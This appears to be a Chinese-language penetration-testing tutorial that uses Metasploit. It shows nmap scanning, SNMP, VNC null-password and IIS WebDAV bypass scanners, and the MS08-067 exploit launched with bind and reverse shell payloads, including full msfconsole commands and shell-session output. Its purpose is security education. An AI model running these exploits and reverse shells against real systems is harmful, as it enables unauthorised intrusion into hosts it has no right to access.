  <p style="margin-left:0cm;"><strong><span style="color:#000000;">[*]&nbsp;&nbsp;&nbsp; Attempting&nbsp; to&nbsp; trigger&nbsp;&nbsp;&nbsp;&nbsp; the&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vulnerability...</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">[*]&nbsp;&nbsp;&nbsp; Sending&nbsp;&nbsp; stage&nbsp; (240&nbsp;&nbsp; bytes) to&nbsp; 192.168.0.7</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">[*]&nbsp;&nbsp;&nbsp; Command&nbsp;&nbsp;&nbsp; shell&nbsp;&nbsp; session&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp; opened&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (192.168.0.3:4444&nbsp;&nbsp;&nbsp;&nbsp; -&gt;&nbsp; 192.168.0.7:1027)</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Microsoft&nbsp; Windows XP Version&nbsp;&nbsp; 5.1.2600 Copyright&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1985-2001&nbsp; Microsoft&nbsp;&nbsp;&nbsp;&nbsp; Corp.</span></strong><strong> </strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">C:\WINDOWS\system32&gt;</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，在选定</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">并设置好</span></strong><strong><span style="color:#000000;">LHOST</span></strong><strong><span style="color:#000000;">参数之后，我们获取了目标主机的本地</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">控</span></strong><strong> </strong><strong><span style="color:#000000;">制权。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">忍者操练</span></strong><strong><span style="color:#00b050;">101</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">本节将讲解漏洞利用框架的各种使用方法。尽管不可能完全展现</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架的各种功能，</span></strong><strong> </strong><strong><span style="color:#000000;">但是细致地挑选了几个案例，演示了它的最重要的功能。如需深入了解</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架，</span></strong><strong> </strong><strong><span style="color:#000000;">请参见官方的在线教程</span></strong><strong><span style="color:#000000;">MetasploitUnleashed</span></strong><strong><span style="color:#000000;">：</span></strong><strong><span style="color:#000000;">http://www.offensive-security.com/metasploitunleashed/</span></strong><strong><span style="color:#000000;">。</span></strong><strong><span style="color:#000000;">官方教程深入地讲解了</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">模板开发、漏洞检测以及各种评估技术。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">场景</span></strong><strong><span style="color:#00b050;">1</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">这个场景将使用</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架集成的</span></strong><strong><span style="color:#000000;">NMap</span></strong><strong><span style="color:#000000;">程序进行端口扫描、</span></strong><strong><span style="color:#000000;">OS</span></strong><strong><span style="color:#000000;">指纹识别，以及服务鉴定。我们在</span></strong><strong><span style="color:#000000;">MSFConsole</span></strong><strong><span style="color:#000000;">中执行下述指令。</span></strong></p> 
  <table border="1" cellspacing="0">
   <tbody>
    <tr>
     <td style="vertical-align:top;"> <p style="margin-left:0cm;"><strong><span style="color:#000000;">首先需要进行的是：启动</span></strong><strong><span style="color:#000000;">postgresql</span></strong><strong><span style="color:#000000;">服务</span></strong></p> <p style="margin-left:0cm;"><img alt="" class="has" height="257" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019051208530219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="826"></p> <p style="margin-left:0cm;"><strong><span style="color:#000000;">然后初始化后台数据库</span></strong></p> <p style="margin-left:0cm;"><strong><span style="color:#000000;">（只有在</span></strong><strong><span style="color:#000000;">postgresql</span></strong><strong><span style="color:#000000;">服务关闭的时候才可以初始化）</span></strong></p> <p style="margin-left:0cm;"><img alt="" class="has" height="83" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085237212.png" width="708"></p> </td> 
    </tr>
   </tbody>
  </table>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">启动</span></strong><strong><span style="color:#000000;">msf5</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="490" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085255689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="604"></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="203" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085238722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="552"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf5&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; load&nbsp;&nbsp;&nbsp; db_tracker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //</span></strong><strong><span style="color:#00b050;">使用插件</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="70" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085233445.png" width="550"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">使用</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架集成的</span></strong><strong><span style="color:#000000;">NMap</span></strong><strong><span style="color:#000000;">程序对脆弱系统进行端口扫描、</span></strong><strong><span style="color:#000000;">OS</span></strong><strong><span style="color:#000000;">指纹识别，以及服务鉴定</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Msf5 &gt;&nbsp;&nbsp;&nbsp;&nbsp; db_nmap&nbsp;&nbsp; &nbsp; -T &nbsp;&nbsp; Aggressive &nbsp;&nbsp;&nbsp;&nbsp; -sV &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -n -O -v &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.198.129</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="688" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085322854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="845"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">使用</span></strong><strong><span style="color:#000000;">db_hosts</span></strong><strong><span style="color:#00b050;">单独查看识别出来的主机</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="202" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085249517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="880"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">使用</span></strong><strong><span style="color:#000000;">db_services</span></strong><strong><span style="color:#00b050;">单独查看识别出的系统服务</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="600" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085319637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="888"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，现在已经成功对目标进行扫描，并且扫描结果已经保存在当前的数据库会话中。如需查看扫描阶段识别出来的目标主机和系统服务，可单独使用</span></strong><strong><span style="color:#000000;">db_hosts</span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;">db_services </span></strong><strong><span style="color:#000000;">指令。另外，如果单独使用</span></strong><strong><span style="color:#000000;">NMAP</span></strong><strong><span style="color:#000000;">程序扫描过目标主机，而且已经把扫描报告保存为</span></strong><strong><span style="color:#000000;">XML </span></strong><strong><span style="color:#000000;">格式的文件，那么可以使用</span></strong><strong><span style="color:#000000;">db_import_nmap_xml</span></strong><strong><span style="color:#000000;">命令把</span></strong><strong><span style="color:#000000;">Nmap</span></strong><strong><span style="color:#000000;">的扫描报告导入到</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">的数据库里。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">场景</span></strong><strong><span style="color:#00b050;">2</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">这个场景将演示</span></strong><strong><span style="color:#000000;"> Metasploit </span></strong><strong><span style="color:#000000;">框架的辅助工具（</span></strong><strong><span style="color:#000000;">auxiliaries</span></strong><strong><span style="color:#000000;">）模板的使用方法，旨在帮助了解辅助工具模板在渗透测试过程中的重要作用。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">SNMP</span></strong><strong><span style="color:#00b050;">字符串扫描程序</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong>&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong>&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#000000;">这个模板可以对指定网段进行</span></strong><strong><span style="color:#000000;">SNMP</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">Simple&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Network&nbsp;&nbsp;&nbsp;&nbsp; Management&nbsp;&nbsp;&nbsp; Protocol</span></strong><strong><span style="color:#000000;">）扫描，并使</span></strong><strong> </strong><strong><span style="color:#000000;">用常见的团体字符对</span></strong><strong><span style="color:#000000;">SNMP</span></strong><strong><span style="color:#000000;">进行测试，最终显示它识别出来的</span></strong><strong><span style="color:#000000;">SNMP</span></strong><strong><span style="color:#000000;">设备信息。</span></strong><strong><span style="color:#00b050;">我们来看：</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; 5&gt; search&nbsp; snmp </span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="654" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085324773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="1200"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; 5&gt; use&nbsp; auxiliary/scanner/snmp/community </span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf5 auxiliary(scanner/snmp/snmp_login) &gt; show options</span></strong><img alt="" class="has" height="443" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085317102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="1200"></p> 
  <p style="margin-left:0cm;">&nbsp;</p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">（上述信息表明，程序识别出了一个启用</span></strong><strong><span style="color:#000000;">SNMP&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">功能的设备，而且该设备可以受理团体字符串</span></strong><strong><span style="color:#000000;"> public</span></strong><strong><span style="color:#000000;">。虽然通过字符串</span></strong><strong><span style="color:#000000;">public&nbsp; </span></strong><strong><span style="color:#000000;">获取的权限只是该设备的只读权限，但是我们仍然可以获取大</span></strong><strong> </strong><strong><span style="color:#000000;">量有价值的信息。这些信息可能包括系统数据、正在运行的服务程序、网络地址、版本号和</span></strong><strong> </strong><strong><span style="color:#000000;">补丁信息等）</span></strong></p> 
  <p style="margin-left:0cm;">&nbsp;</p> 
  <ul>
   <li><strong><span style="color:#00b050;">VNC</span></strong><strong><span style="color:#00b050;">空密码扫描程序</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">这个模板将会扫描指定的网段，搜索可以使用空密码访问的虚机网络计算（</span></strong><strong><span style="color:#000000;">Virtual&nbsp;&nbsp;&nbsp;&nbsp; Network Computing</span></strong><strong><span style="color:#000000;">，</span></strong><strong><span style="color:#000000;">VNC</span></strong><strong><span style="color:#000000;">）服务器。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">进行扫描的指令如下。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; auxiliary/scanner/vnc/vnc_none_auth</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(vnc_none_auth)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(vnc_none_auth)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set </span></strong><strong><span style="color:#00b050;">RHOSTS&nbsp;&nbsp; 10.4.124.0/24</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(vnc_none_auth)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; run </span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架确实找到了很多无需验证就可访问的</span></strong><strong><span style="color:#000000;">VNC</span></strong><strong><span style="color:#000000;">服务器。若不采取身份认证的访问控制措施，这些主机将会招引不速之客访问</span></strong><strong><span style="color:#000000;">VNC</span></strong><strong><span style="color:#000000;">服务器，终将成为系统管理员的一大威胁。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">IIS6&nbsp;&nbsp;&nbsp; WebDAV Unicode&nbsp; </span></strong><strong><span style="color:#00b050;">身份验证旁路漏洞</span></strong><strong> </strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong>&nbsp;&nbsp;&nbsp;&nbsp; </strong><strong><span style="color:#000000;">这个模板将会扫描指定的网段，以搜索存在</span></strong><strong><span style="color:#000000;">IIS6 WebDAV </span></strong><strong><span style="color:#000000;">认证旁路漏洞的主机。启动扫描任务的指令如下。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf &gt;</span></strong><strong><span style="color:#00b050;">&nbsp; use</span></strong><strong>&nbsp; &nbsp; </strong><strong><span style="color:#00b050;">auxiliary/scanner/http/ms09_020_webdav_unicode_bypass</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(ms09_020_webdav_unicode_bypass)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp;&nbsp; show &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(ms09_020_webdav_unicode_bypass)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp;&nbsp; set RHOSTS &nbsp;10.8.183.0/24 </span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf auxiliary(ms09_020_webdav_unicode_bypass)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; THREADS &nbsp; 10</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf auxiliary(ms09_020_webdav_unicode_bypass)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; run</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，</span></strong><strong><span style="color:#000000;">Metasploit&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">框架完成了对目标网段的扫描，已经找到了存在</span></strong><strong><span style="color:#000000;"> MS09-020&nbsp;&nbsp;&nbsp; IIS6 WebDAV&nbsp;&nbsp;&nbsp;&nbsp; Unicode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Authentication&nbsp;&nbsp;&nbsp;&nbsp; Bypass</span></strong><strong><span style="color:#000000;">漏洞的主机。或许，这种模板有助于我们发现网络中配置不当的服务器，提前发现安全隐患。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">场景</span></strong><strong><span style="color:#00b050;">3</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">这个场景将会介绍几种常见的</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">bind</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">reverse&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;">meterpreter&nbsp;&nbsp;&nbsp; shell</span></strong><strong><span style="color:#000000;">），并且以漏洞利</span></strong><strong> </strong><strong><span style="color:#000000;">用的角度探讨它们的功能。这些实例还将展示</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">的使用方法和时机</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">bind&nbsp;&nbsp; shell</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">bind</span></strong><strong><span style="color:#000000;">（绑定型）</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">用于提供远程</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">连接。在成功利用了目标主机上的安全漏洞，并且成功执行了</span></strong><strong><span style="color:#000000;">shellcode</span></strong><strong><span style="color:#000000;">程序以后，渗透人员可在目标主机上的特定端口上运行</span></strong><strong><span style="color:#000000;">bind shell</span></strong><strong><span style="color:#000000;">，以让其</span></strong><strong> </strong><strong><span style="color:#000000;">他主机继续控制这台主机。攻击人员可以使用基于</span></strong><strong><span style="color:#000000;">TCP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">连接的标准输入输出（</span></strong><strong><span style="color:#000000;">stdin/stdout</span></strong><strong><span style="color:#000000;">）</span></strong><strong> </strong><strong><span style="color:#000000;">隧道工具（例如</span></strong><strong><span style="color:#000000;">Netcat</span></strong><strong><span style="color:#000000;">）连接到被攻破的主机，通过</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; bind&nbsp;&nbsp;&nbsp; shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">继续实施控制。它的应用场合与</span></strong><strong><span style="color:#000000;">&nbsp; Telnet </span></strong><strong><span style="color:#000000;">服务器</span></strong><strong><span style="color:#000000;">/</span></strong><strong><span style="color:#000000;">客户端十分相似，主要适用于以</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; NAT</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">Network Address&nbsp;&nbsp; Translation</span></strong><strong><span style="color:#000000;">）方式连入网络的渗透人员、攻击人员的设备与目标主机之间有防火墙的情况，即适用于无法从</span></strong><strong> </strong><strong><span style="color:#000000;">被测主机直接连接到攻击人员主机</span></strong><strong><span style="color:#000000;">IP</span></strong><strong><span style="color:#000000;">的各种情况。</span></strong><strong> </strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">可通过下述指令利用主机漏洞并安装</span></strong><strong><span style="color:#00b050;">bind&nbsp;&nbsp; shell</span></strong><strong><span style="color:#00b050;">。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp;&nbsp;&nbsp;&nbsp; exploit/windows/smb/ms08_067_netapi</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="209" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085255246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="713"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; &nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="208" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085256601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="885"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp;&nbsp;&nbsp; RHOST&nbsp;&nbsp;&nbsp;&nbsp; 192.168.0.7</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set PAYLOAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; windows/shell/bind_tcp</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="297" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085314234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="908"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="132" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085249712.png" width="929"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，</span></strong><strong><span style="color:#000000;">Metasploit&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">通过集成的</span></strong><strong><span style="color:#000000;">payload&nbsp; </span></strong><strong><span style="color:#000000;">处理程序自动连接到了</span></strong><strong><span style="color:#000000;">bind shell</span></strong><strong><span style="color:#000000;">。我们可以自</span></strong><strong> </strong><strong><span style="color:#000000;">己编写</span></strong><strong><span style="color:#000000;">shellcode</span></strong><strong><span style="color:#000000;">，利用</span></strong><strong><span style="color:#000000;">exploit </span></strong><strong><span style="color:#000000;">程序安装</span></strong><strong><span style="color:#000000;">bind&nbsp; shell</span></strong><strong><span style="color:#000000;">，然后再使用</span></strong><strong><span style="color:#000000;">Netcat&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">这类第三方工具连接到</span></strong><strong><span style="color:#000000;"> bind shell</span></strong><strong><span style="color:#000000;">。有关</span></strong><strong><span style="color:#000000;"> netcat </span></strong><strong><span style="color:#000000;">在网络安全测试中的各种用途的实例说明，请参见</span></strong><strong> </strong><a href="http://en.wikipedia.org/wiki/Netcat" rel="nofollow"><strong>http://en.wikipedia.org/wiki/Netcat</strong></a><strong><span style="color:#000000;">。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">reverse&nbsp; shell </span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">reverse</span></strong><strong><span style="color:#00b050;">（反射型）</span></strong><strong><span style="color:#00b050;">shell</span></strong><strong><span style="color:#000000;">与</span></strong><strong><span style="color:#00b050;">绑定型（</span></strong><strong><span style="color:#00b050;">bind</span></strong><strong><span style="color:#00b050;">）</span></strong><strong><span style="color:#00b050;">shell</span></strong><strong><span style="color:#00b050;">截然不同。</span></strong><strong><span style="color:#00b050;">reverse &nbsp; shell</span></strong><strong><span style="color:#00b050;">不</span></strong><strong><span style="color:#000000;">是在目标机器上绑</span></strong><strong> </strong><strong><span style="color:#000000;">定端口，被动地受理攻击人员的机器连接，而是采用反弹的方法，让被测主机主动地连接攻</span></strong><strong> </strong><strong><span style="color:#000000;">击者的</span></strong><strong><span style="color:#000000;">IP</span></strong><strong><span style="color:#000000;">和端口，并提供一个</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">。</span></strong><strong><span style="color:#00b050;">reverse shell</span></strong><strong><span style="color:#000000;">适用于被测主机采用</span></strong><strong><span style="color:#000000;">NAT</span></strong><strong><span style="color:#000000;">方式连接网络的情况，或者被测主机受防火墙保护而使渗透人员不能从外网直接访问被测主机的各种情况。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">下述指令可设置安装</span></strong><strong><span style="color:#00b050;">reverse shell</span></strong><strong><span style="color:#00b050;">。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp; exploit/windows/smb/ms08_067_netapi</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="40" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085239154.png" width="874"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set RHOST&nbsp;&nbsp; &nbsp; **.**.**.**</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="79" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085240683.png" width="730"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp;&nbsp;&nbsp; PAYLOAD windows/shell/reverse_tcp &nbsp;</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; &nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="523" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085315481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="952"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set LHOST&nbsp;&nbsp;&nbsp; &nbsp; *.*.*.*</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="214" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085258222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="926"></p> 
